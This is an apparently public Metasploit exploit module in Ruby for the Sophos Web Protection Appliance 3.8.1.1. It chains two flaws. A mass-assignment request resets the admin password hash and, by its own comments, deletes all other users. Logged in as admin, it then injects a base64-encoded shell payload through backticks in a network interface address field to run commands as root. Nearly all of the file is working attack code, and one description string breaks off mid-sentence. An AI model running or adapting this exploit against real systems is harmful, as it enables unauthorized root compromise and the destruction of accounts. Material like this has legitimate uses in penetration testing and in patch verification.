# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module takes advantage of two vulnerabilities in order to gain remote code execution as root
        as an otherwise non-privileged authorized user. By taking advantage of a mass assignment
        vulnerability that allows an unprivileged authenticated user to change the admininistrator&#039;s
        password hash, the module updates the password to login as the admin to reach the second vulnerability.
        No server-side sanitization is done on values passed when configuring a static network interface.
        This allows an administrator user to run arbitrary commands in the context of the web application,
        which is root when configuring the network interface. This module will inadvertently delete
      },
      &#039;Author&#039;         =>
        [
          &#039;Brandon Perry <bperry.volatile@gmail.com>&#039; # discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-14-069/&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 500,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "", #base64 encryption ftw!
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; =>  &#039;generic telnet&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Sophos Web Protection Appliance 3.8.1.1&#039;, { }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 8 2014&#039;
      ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate as&#039;, nil]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;, nil]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The target URI&#039;, &#039;/&#039;]),
        Opt::RPORT(443)
      ],
      self.class
    )
  end

  def exploit
      init = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;)
      })

      if !init or !init.body
        fail_with("Could not connect to host")
      end

      print_status("Getting STYLE key...")

      style = &#039;&#039;
      init.body.each_line do |line|
        next if line !~ /name="STYLE" value="(.*)"/
        style = $1
      end

      if style == &#039;&#039;
        fail_with("Could not find style key.")
      end

      post = {
       &#039;STYLE&#039; => style,
       &#039;destination&#039; => &#039;&#039;,
       &#039;section&#039; => &#039;&#039;,
       &#039;username&#039; => datastore[&#039;USERNAME&#039;],
       &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }

      print_status("Authenticating as " + datastore[&#039;USERNAME&#039;])
      login = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/index.php?c=login&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => post
      })

      if !login or login.code != 200 or login.body !~ /#{datastore[&#039;USERNAME&#039;]}<\/a>/
        fail_with("Authentication failed")
      end

      #I don&#039;t know what salt is being used to hash these
      #passwords (probably in js somewhere), so I have
      #to use a static one that I saw being POSTed while
      #exploring, it is &#039;notpassword&#039;.
      #
      #This will actually delete every other user that exists
      #except for admin, whose password will be changed
      #
      #whoops
      admin_hash = &#039;[{"id": "default_admin", "username": "admin", "name": "Default Administrator"&#039;
      admin_hash << &#039;, "password": "70ec23d3e019a307081732c0162b2733", "description": "Default &#039;
      admin_hash << &#039;Administrator Account", "admin": true, "roles": ["admin"], "reporting_groups"&#039;
      admin_hash << &#039;: [], "user_id": 0}]&#039;

      post = {
        &#039;action&#039; => &#039;save&#039;,
        &#039;STYLE&#039; => style,
        &#039;username&#039; => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;])),
        &#039;current&#039; => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])),
        &#039;new&#039; => Rex::Text.uri_encode(Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])),
        &#039;admins&#039; => admin_hash
      }

      print_status("Changing old password hash to notpassword")
      passchange = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/index.php?c=change_password&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => post
      })

      if !passchange or passchange.code != 200
        fail_with("Couldn&#039;t update admin&#039;s password")
      end

      print_status("Logging in as the admin now")
      init = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;)
      })

      if !init or init.code != 200
        fail_with("Couldn&#039;t reget index page for admin auth")
      end

      init.body.each_line do |line|
        next if line !~ /name="STYLE" value="(.*)"/
        style = $1
      end

      post = {
        &#039;STYLE&#039; => style,
        &#039;destination&#039; => &#039;&#039;,
        &#039;section&#039; => &#039;&#039;,
        &#039;username&#039; => &#039;admin&#039;,
        &#039;password&#039; => &#039;notpassword&#039;
      }

      login = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php?c=login&#039;),
        &#039;method&#039; =>  &#039;POST&#039;,
        &#039;vars_post&#039; => post
      })

      if !login or login.code != 200 or login.body !~ /admin<\/a>/
        fail_with("Couldn&#039;t login as admin")
      end

      pay = Rex::Text.uri_encode(Rex::Text.encode_base64(payload.encoded))
      post = {
        &#039;STYLE&#039; => style,
        &#039;dhcp&#039; => &#039;no&#039;,
        &#039;address&#039; => "192.16`echo #{pay}|base64 --decode|sh`8.1.16",
        &#039;gateway&#039; => &#039;192.168.1.254&#039;,
        &#039;sb_bridge&#039; => &#039;explicit&#039;,
        &#039;netmask&#039; => &#039;255.255.255.0&#039;,
        &#039;sb_linktype&#039; => &#039;auto&#039;,
        &#039;dns&#039; => &#039;yes&#039;,
        &#039;dns1&#039; => &#039;192.168.1.254&#039;,
        &#039;dns2&#039; => &#039;&#039;,
        &#039;dns3&#039; => &#039;&#039;
      }

      print_status("Sending payload")
      send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php?c=netinterface&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => post,
      })
  end
end

